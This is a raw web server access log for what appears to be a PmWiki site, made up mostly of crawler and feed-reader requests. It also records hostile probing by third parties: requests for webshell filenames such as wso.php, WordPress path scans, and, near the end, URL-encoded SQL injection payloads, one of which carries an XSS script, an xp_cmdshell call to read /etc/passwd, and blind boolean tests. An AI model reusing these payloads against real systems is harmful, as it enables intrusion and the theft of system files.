216.244.66.238 - - [18/Oct/2022:07:37:02 +0200] "GET /AmiKo/Linux?action=upload HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
185.191.171.23 - - [18/Oct/2022:07:38:18 +0200] "GET /AmiKo/Swisspeddose?n=Main.SideBar%3Faction%3Dedit HTTP/1.1" 302 157 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.16 - - [18/Oct/2022:07:39:01 +0200] "GET /PublicDomain/AIPS?action=edit HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.11 - - [18/Oct/2022:07:40:33 +0200] "GET /Main/Parsen?action=upload HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.45 - - [18/Oct/2022:07:43:35 +0200] "GET /Main/ForderungstabelleSpezialitaetenliste?action=upload HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.19 - - [18/Oct/2022:07:43:37 +0200] "GET /AmiKo/Flyer?action=upload HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.7 - - [18/Oct/2022:07:46:37 +0200] "GET /Software/Spreadsheet HTTP/1.1" 200 8839 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.9 - - [18/Oct/2022:07:48:51 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.42 - - [18/Oct/2022:07:48:51 +0200] "GET /Ywesee/OpenStandards?n=Main.SideBar%3Faction%3Dedit HTTP/1.1" 302 157 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
193.247.208.98 - - [18/Oct/2022:07:49:01 +0200] "HEAD / HTTP/1.1" 200 - "https://www.hin.ch" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
185.191.171.1 - - [18/Oct/2022:07:49:51 +0200] "GET /Oddb2xml/DatenDownload?action=diff HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
207.46.13.159 - - [18/Oct/2022:07:52:46 +0200] "GET / HTTP/1.1" 200 13326 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.191.171.19 - - [18/Oct/2022:07:53:33 +0200] "GET /Swissmedic/Dateninstitut?action=upload HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.36 - - [18/Oct/2022:07:55:35 +0200] "GET /Software/BBMB?n=Main.SideBar%3Faction%3Dedit HTTP/1.1" 302 157 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
194.209.200.2 - - [18/Oct/2022:07:57:05 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:07:57:05 +0200] "GET /Main/2013 HTTP/1.1" 200 20487 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:07:58:25 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:07:58:56 +0200] "GET /AmiKo/Web HTTP/1.1" 200 9588 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:07:59:44 +0200] "GET /Ywesee/OpenSource HTTP/1.1" 200 10790 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:08:00:19 +0200] "GET /Main/2009 HTTP/1.1" 200 21688 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
185.191.171.4 - - [18/Oct/2022:08:00:35 +0200] "GET /Ywesee/KurzFachinfo HTTP/1.1" 200 8845 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
194.209.200.2 - - [18/Oct/2022:08:01:02 +0200] "GET /Main/2012 HTTP/1.1" 200 31941 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
54.36.149.8 - - [18/Oct/2022:08:04:11 +0200] "GET /Apotheke/POS HTTP/1.1" 200 11138 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.111.32.93 - - [18/Oct/2022:08:04:46 +0200] "GET /uploads/Main/B-2597_2017.pdf HTTP/1.1" 200 3342329 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +https://naver.me/spd)"
216.244.66.238 - - [18/Oct/2022:08:06:06 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.238 - - [18/Oct/2022:08:06:07 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
185.191.171.39 - - [18/Oct/2022:08:07:11 +0200] "GET /AmiKo/SAPP?action=edit HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.10 - - [18/Oct/2022:08:07:51 +0200] "GET /Swissmedic/Formatvorlagen?action=print HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.1 - - [18/Oct/2022:08:08:29 +0200] "GET /Refdata/LoeschungFelder?action=print HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
209.133.192.178 - - [18/Oct/2022:08:08:57 +0200] "HEAD / HTTP/1.1" 200 - "-" "\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\""
54.36.149.60 - - [18/Oct/2022:08:12:30 +0200] "GET /PublicDomain/Stammdaten HTTP/1.1" 200 11234 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.7 - - [18/Oct/2022:08:13:25 +0200] "GET /ODDB/ODDBxml HTTP/1.1" 200 8728 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.40 - - [18/Oct/2022:08:13:34 +0200] "GET /Main/2021 HTTP/1.1" 200 16484 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.42 - - [18/Oct/2022:08:13:37 +0200] "GET /Epha/Flow?action=print HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
66.249.93.178 - - [18/Oct/2022:08:14:32 +0200] "HEAD /pmwiki.php/Site/AllRecentChanges?action=rss HTTP/1.1" 200 - "-" "FeedBurner/1.0 (http://www.FeedBurner.com)"
66.249.93.174 - - [18/Oct/2022:08:14:32 +0200] "GET /pmwiki.php/Site/AllRecentChanges?action=rss HTTP/1.1" 200 2546 "-" "FeedBurner/1.0 (http://www.FeedBurner.com)"
64.71.157.122 - - [18/Oct/2022:08:14:36 +0200] "GET /pmwiki.php/Site/AllRecentChanges?action=rss HTTP/1.1" 200 2546 "-" "Feedbin feed-id:590358 - 1 subscribers"
103.131.71.232 - - [18/Oct/2022:08:16:50 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)"
20.0.225.29 - - [18/Oct/2022:08:18:34 +0200] "GET /ups.php HTTP/1.1" 404 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
20.0.225.29 - - [18/Oct/2022:08:18:34 +0200] "GET /doc.php HTTP/1.1" 404 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
20.0.225.29 - - [18/Oct/2022:08:18:34 +0200] "GET /wso.php HTTP/1.1" 404 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
20.0.225.29 - - [18/Oct/2022:08:18:34 +0200] "GET /media-admin.php HTTP/1.1" 404 278 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
20.0.225.29 - - [18/Oct/2022:08:18:34 +0200] "GET /admin.php HTTP/1.1" 404 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
20.0.225.29 - - [18/Oct/2022:08:18:34 +0200] "GET /fw.php HTTP/1.1" 404 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
20.0.225.29 - - [18/Oct/2022:08:18:34 +0200] "GET /1index.php HTTP/1.1" 404 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
20.0.225.29 - - [18/Oct/2022:08:18:34 +0200] "GET /radio.php HTTP/1.1" 404 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
20.0.225.29 - - [18/Oct/2022:08:18:34 +0200] "GET /xleet.php HTTP/1.1" 404 272 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
185.191.171.10 - - [18/Oct/2022:08:20:13 +0200] "GET /Main/Parsen HTTP/1.1" 200 8581 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.238 - - [18/Oct/2022:08:23:51 +0200] "GET /en/gcc/compare/ean13/7680335241854 HTTP/1.1" 404 293 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
106.227.34.64 - - [18/Oct/2022:08:24:14 +0200] "GET /js/GB_BIG.js HTTP/1.1" 404 271 "http://www.ywesee.com/js/GB_BIG.js" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
185.191.171.38 - - [18/Oct/2022:08:25:31 +0200] "GET /Main/OmixOcas?n=Main.SideBar%3Faction%3Dedit HTTP/1.1" 302 157 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.238 - - [18/Oct/2022:08:25:32 +0200] "GET /uploads/Main/Keyaussagen_ywesee.txt HTTP/1.1" 200 1021 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.238 - - [18/Oct/2022:08:26:23 +0200] "GET /uploads/Main/117_Email_an_Franz.Schneller_13.6.2005.txt HTTP/1.1" 200 2784 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
194.209.200.2 - - [18/Oct/2022:08:26:41 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:08:26:41 +0200] "GET /AmiKo/Linux HTTP/1.1" 200 9217 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:08:29:36 +0200] "GET /Main/2015 HTTP/1.1" 200 15908 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:08:29:48 +0200] "GET /Main/2013 HTTP/1.1" 200 20487 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:08:31:36 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
62.210.215.119 - - [18/Oct/2022:08:31:56 +0200] "GET /Site/AllRecentChanges?action=rss HTTP/1.1" 200 2546 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.66 Safari/537.36"
194.209.200.2 - - [18/Oct/2022:08:32:15 +0200] "GET /AmiKo/Web HTTP/1.1" 200 9588 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:08:33:18 +0200] "GET /Ywesee/OpenSource HTTP/1.1" 200 10790 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:08:34:03 +0200] "GET /Main/2009 HTTP/1.1" 200 21688 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
185.191.171.33 - - [18/Oct/2022:08:34:57 +0200] "GET /Swissmedic/Aips2xml HTTP/1.1" 200 9533 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.8 - - [18/Oct/2022:08:36:25 +0200] "GET /Swissmedic/PraeparatelisteMitWS?action=diff HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
34.140.135.54 - - [18/Oct/2022:08:36:27 +0200] "HEAD / HTTP/1.1" 200 - "-" "Apache-HttpClient/4.5.5 (Java/11.0.9)"
185.191.171.44 - - [18/Oct/2022:08:38:56 +0200] "GET /Main/2005?action=upload HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
54.36.149.49 - - [18/Oct/2022:08:40:05 +0200] "GET /AmiKo/Linux HTTP/1.1" 200 9217 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.36 - - [18/Oct/2022:08:40:34 +0200] "GET /Epha/PhilipHansten?action=edit HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //wp-includes/ID3/license.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //feed/ HTTP/1.1" 404 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //xmlrpc.php?rsd HTTP/1.1" 404 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 296 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //2021/wp-includes/wlwmanifest.xml HTTP/1.1" 404 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
144.76.45.216 - - [18/Oct/2022:08:41:25 +0200] "GET //cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
185.191.171.22 - - [18/Oct/2022:08:43:49 +0200] "GET /Swissmedic/AIPSXMLImport HTTP/1.1" 200 10819 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.8 - - [18/Oct/2022:08:44:32 +0200] "GET /AmiKo/Swisspeddose?action=diff HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.111.32.35 - - [18/Oct/2022:08:44:46 +0200] "GET /uploads/Main/Klageantwort.pdf HTTP/1.1" 200 154345 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +https://naver.me/spd)"
185.191.171.6 - - [18/Oct/2022:08:45:16 +0200] "GET /Site/AllRecentChanges?action=rss HTTP/1.1" 200 2546 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.39 - - [18/Oct/2022:08:50:37 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.38 - - [18/Oct/2022:08:50:38 +0200] "GET /Swissmedic/Formatvorlagen HTTP/1.1" 200 9935 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.17 - - [18/Oct/2022:08:51:43 +0200] "GET /ODDB/FachinfoAlsEbook?action=diff HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.33 - - [18/Oct/2022:08:51:52 +0200] "GET /Miele/Index HTTP/1.1" 200 8591 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.35 - - [18/Oct/2022:08:54:35 +0200] "GET /Miele/Index?action=print HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.42 - - [18/Oct/2022:08:55:39 +0200] "GET /Ywesee/IGM11?action=diff HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.21 - - [18/Oct/2022:08:55:58 +0200] "GET /Profiles/Zrr?action=diff HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
64.71.157.112 - - [18/Oct/2022:08:57:08 +0200] "GET /pmwiki.php/Site/AllRecentChanges?action=rss HTTP/1.1" 200 2546 "-" "Feedbin feed-id:590358 - 1 subscribers"
87.249.43.162 - - [18/Oct/2022:08:57:59 +0200] "GET /wp-commentin.php HTTP/1.1" 404 275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
216.244.66.238 - - [18/Oct/2022:08:59:51 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
81.19.136.15 - - [18/Oct/2022:09:00:13 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki&q=1 HTTP/1.1" 200 64010 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:16 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki&q=1&hzBr%3D8710%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 64010 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:19 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki&q=1 HTTP/1.1" 200 64010 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:20 +0200] "GET /Main/SearchWiki?pagename=8432&q=1 HTTP/1.1" 200 63999 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:24 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%28%2C%2C%2C%27%22%29%22%2C&q=1 HTTP/1.1" 200 64030 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:27 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27YPTDQw%3C%27%22%3EBjMNPK&q=1 HTTP/1.1" 200 64037 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
173.255.160.23 - - [18/Oct/2022:09:00:35 +0200] "GET / HTTP/1.1" 200 13326 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
81.19.136.15 - - [18/Oct/2022:09:00:34 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%20AND%207741%3D8210%20AND%20%285562%3D5562&q=1 HTTP/1.1" 200 64040 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:38 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%20AND%205957%3D5957%20AND%20%281617%3D1617&q=1 HTTP/1.1" 200 64040 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
194.209.200.2 - - [18/Oct/2022:09:00:40 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [18/Oct/2022:09:00:40 +0200] "GET /AmiKo/Linux HTTP/1.1" 200 9217 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
81.19.136.15 - - [18/Oct/2022:09:00:41 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%204258%3D4552&q=1 HTTP/1.1" 200 64024 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:44 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%205957%3D5957&q=1 HTTP/1.1" 200 64024 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:47 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%20AND%201860%3D4409%20AND%20%28%27Hikk%27%3D%27Hikk&q=1 HTTP/1.1" 200 64064 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:51 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%20AND%205957%3D5957%20AND%20%28%27wGWG%27%3D%27wGWG&q=1 HTTP/1.1" 200 64064 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:54 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%20AND%206583%3D9659%20AND%20%27lcdC%27%3D%27lcdC&q=1 HTTP/1.1" 200 64062 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:00:57 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%20AND%205957%3D5957%20AND%20%27SodO%27%3D%27SodO&q=1 HTTP/1.1" 200 64062 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:01 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%20AND%202857%3D3410%20AND%20%27%25%27%3D%27&q=1 HTTP/1.1" 200 64056 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:04 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%20AND%205957%3D5957%20AND%20%27%25%27%3D%27&q=1 HTTP/1.1" 200 64056 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
